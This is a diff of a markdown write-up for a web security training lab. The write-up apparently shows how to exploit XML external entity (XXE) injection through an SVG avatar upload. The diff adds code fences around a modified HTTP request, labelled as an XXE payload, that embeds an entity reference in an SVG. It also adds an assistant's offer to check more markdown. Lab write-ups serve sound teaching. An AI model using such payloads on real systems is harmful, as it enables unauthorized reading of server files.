@@ -154,9 +154,11 @@ Content-Type: image/png
 
 [PNG binary data]
 ------Boundary--
+```
 
 ### Modified Request (SVG XXE Payload)
 
+```http
 POST /post/comment HTTP/2
 Host: 0a6300cb035e668c80892199001f005a.web-security-academy.net
 Cookie: session=QMRvADT706bnnS56HrZyo4pEpuVQlEcR
@@ -191,6 +193,7 @@ Content-Type: image/svg+xml
   <text font-size="24" x="10" y="50" fill="red" font-weight="bold">&xxe;</text>
 </svg>
 ------Boundary--
+```
 
 ## Key Modifications
 
@@ -221,6 +224,10 @@ bob miller | 19 July 2026
 good
 [Avatar displaying: 730e06daaa2d]
 ```
+***
+
+Would you like me to check any other blocks of markdown text for **syntax structure** or **rendering errors**?
+
 
 ### Lab Completion
 
